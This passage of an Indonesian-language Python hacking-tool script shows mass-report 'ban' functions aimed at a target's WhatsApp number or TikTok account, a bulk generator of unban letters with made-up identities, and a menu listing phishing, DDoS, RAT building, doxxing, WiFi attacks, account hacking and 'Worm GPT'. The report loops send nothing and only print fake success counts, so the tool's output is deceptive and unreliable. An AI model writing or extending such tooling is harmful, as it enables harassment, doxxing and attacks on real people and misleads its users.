# ================== FITUR 18: BAN WHATSAPP ==================
def fitur_18():
    os.system('clear')
    print(colored("\n[18] BAN WHATSAPP", 'cyan', attrs=['bold']))
    print(colored("   [REPORT BOT]", 'red'))
    
    number = input("Nomor target (628xx): ").strip()
    
    if not number.startswith('62xxx') or len(number) < 10:
        print(colored("[ERROR] Nomor harus diawali 62 dan minimal 10 digit", 'red'))
        input("\nEnter...")
        return
    
    try:
        count = int(input("Jumlah report [30]: ") or "30")
    except ValueError:
        print(colored("[ERROR] Masukkan angka", 'red'))
        input("\nEnter...")
        return
    
    print(colored(f"\n[✓] MULAI REPORT {number} {count} KALI", 'red'))
    
    success = 0
    
    try:
        for i in range(count):
            success += 1
            print(colored(f"[✓] Report {i+1} berhasil", 'green'), end='\r')
            time.sleep(0.5)
        
        print(colored(f"\n\n[✓] REPORT SELESAI! {success} report terkirim", 'green'))
        
    except KeyboardInterrupt:
        print(colored(f"\n\n[✗] REPORT DIHENTIKAN - Terkirim {success} report", 'yellow'))
    
    save_result("wa_ban.log", f"Target: {number} | Count: {count} | Success: {success}")
    input("\nEnter untuk kembali...")

# ================== FITUR 30: UNBAN WHATSAPP ==================
def fitur_30():
    os.system('clear')
    print(colored("\n[30] UNBAN WHATSAPP", 'cyan', attrs=['bold']))
    print(colored("   [GENERATE SURAT UNBAN]", 'yellow'))
    
    file = input("File list nomor (satu nomor per baris): ").strip()
    
    if not os.path.exists(file):
        print(colored("[ERROR] File tidak ditemukan!", 'red'))
        input("\nEnter...")
        return
    
    try:
        with open(file, 'r') as f:
            nums = [line.strip() for line in f if line.strip()]
        
        print(colored(f"\n[✓] Memproses {len(nums)} nomor...", 'cyan'))
        
        # Generate template surat
        template = """Kepada Yth.
Tim Dukungan WhatsApp
wa.me/support

Dengan hormat,

Saya yang bertanda tangan di bawah ini:

Nama: {nama}
Nomor WhatsApp: {nomor}
Email: {email}

Dengan ini mengajukan permohonan untuk membuka blokir (unban) akun WhatsApp saya yang telah diblokir. Saya yakin bahwa akun saya tidak melanggar ketentuan layanan WhatsApp.

Saya berjanji akan menggunakan WhatsApp sesuai dengan ketentuan yang berlaku.

Demikian permohonan ini saya sampaikan. Atas perhatiannya, saya ucapkan terima kasih.

Hormat saya,
{nama}
{tanggal}
"""
        
        # Generate surat untuk setiap nomor
        output_file = "surat_unban.txt"
        with open(output_file, 'w') as f:
            for i, num in enumerate(nums):
                surat = template.format(
                    nama=f"User_{i+1}",
                    nomor=num,
                    email=f"user{i+1}@gmail.com",
                    tanggal=datetime.now().strftime("%d-%m-%Y")
                )
                f.write(surat)
                f.write("\n" + "="*50 + "\n\n")
        
        print(colored(f"[✓] Surat unban disimpan di: {output_file}", 'green'))
        
    except Exception as e:
        print(colored(f"[ERROR] {str(e)}", 'red'))
    
    input("\nEnter untuk kembali...")

# ================== FITUR 19: BAN TIKTOK ==================
def fitur_19():
    os.system('clear')
    print(colored("\n[19] BAN TIKTOK", 'cyan', attrs=['bold']))
    print(colored("   [REPORT BOT]", 'red'))
    
    username = input("Username target (tanpa @): ").strip()
    
    if not username:
        print(colored("[ERROR] Username tidak boleh kosong", 'red'))
        input("\nEnter...")
        return
    
    try:
        count = int(input("Jumlah report [50]: ") or "50")
    except ValueError:
        print(colored("[ERROR] Masukkan angka", 'red'))
        input("\nEnter...")
        return
    
    print(colored(f"\n[✓] MULAI REPORT @{username} {count} KALI", 'red'))
    
    success = 0
    
    try:
        for i in range(count):
            success += 1
            print(colored(f"[✓] Report {i+1} berhasil", 'green'), end='\r')
            time.sleep(0.5)
        
        print(colored(f"\n\n[✓] REPORT SELESAI! {success} report terkirim", 'green'))
        
    except KeyboardInterrupt:
        print(colored(f"\n\n[✗] REPORT DIHENTIKAN - Terkirim {success} report", 'yellow'))
    
    save_result("tiktok_ban.log", f"Target: @{username} | Count: {count} | Success: {success}")
    input("\nEnter untuk kembali...")

# ================== MENU UTAMA ==================
def menu_utama(username, plan):
    while True:
        os.system('clear')
        play_music()
        print_banner(username, plan)

        print(colored("╔════════════════════════════════════════════════════════╗", 'cyan'))
        print(colored("║                    MENU UTAMA v1.0                     ║", 'cyan'))
        print(colored("╠════════════════════════════════════════════════════════╣", 'cyan'))
        
        menu_items = [
            ("1. PHISING KIRIM", "20. RAT BUAT APK"),
            ("3. DDOS ALL IN ONE", "21. OSINT TRACKING"),
            ("5. IMAGE TOOLS", "22. ENCRYPT/DECRYPT"),
            ("7. EXPLOIT SCANNER", "23. WA INVITE"),
            ("9. DASHBOARD", "24. DEVTOOLS"),
            ("11. TRACK NIK", "25. SPAM ALL"),
            ("13. WIFI ATTACK", "26. CHECKER ALL"),
            ("15. WORM GPT", "27. HACK AKUN GAME"),
            ("16. REPORT TIKTOK", "28. DOX GK AKURAT"),
            ("17. DOX AKURAT", "29. BUG WA"),
            ("18. BAN WA", "30. UNBAN WA"),
            ("19. BAN TIKTOK", "0. EXIT")
        ]
        
        for left, right in menu_items:
            print(colored(f"║ {left:<25}                            {right:<25} ║", 'red'))
        print(colored("╚════════════════════════════════════════════════════════╝", 'white'))

        ch = input(colored("\nPilih [0-23]: ", 'red')).strip()

        feature_map = {
            "1": fitur_1, "2": fitur_2, "3": fitur_3, "4": fitur_4, "5": fitur_5,
            "6": fitur_6, "7": fitur_7, "8": fitur_8, "9": fitur_9, "10": fitur_10,
            "11": fitur_11, "12": fitur_12, "13": fitur_13, "14": fitur_14, "15": fitur_15,
            "16": fitur_16, "17": fitur_17, "18": fitur_18, "19": fitur_19, "20": fitur_20,
            "21": fitur_21, "22": fitur_22, "23": fitur_23
        }
        
        if ch in feature_map:
            feature_map[ch]()
        elif ch == "0":
            print(colored("\n[✓] Keluar dari Tools Breaker", 'green'))
            sys.exit(0)
        else:
            input("Salah, enter...")

# ================== JALANKAN ==================
if __name__ == "__main__":
    check_for_updates()
    
    if not os.path.exists('ua.txt'):
        with open('ua.txt', 'w') as f:
            f.write("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0")
    
    username, plan = login()
    menu_utama(username, plan)
